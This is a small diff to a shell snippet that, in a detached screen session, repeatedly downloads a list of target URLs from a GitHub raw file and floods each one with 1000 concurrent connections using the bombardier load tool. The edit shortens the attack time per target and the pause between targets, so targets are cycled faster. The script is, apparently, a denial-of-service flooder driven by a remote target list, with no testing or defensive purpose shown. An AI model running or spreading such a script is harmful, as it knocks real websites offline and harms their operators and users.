@@ -642,8 +642,8 @@ screen -dm bash -c '
 while true do
 	curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list > /tmp/list
 	while read p; do
-	  docker run -it alpine/bombardier -c 1000 -d 60s -l "$p"
-	  sleep 5
 	  echo "$p"
-	done </tmp/list
+	  docker run -i alpine/bombardier -c 1000 -d 6s -l "$p"
+	  sleep 1;
+	done < /tmp/list
 done'
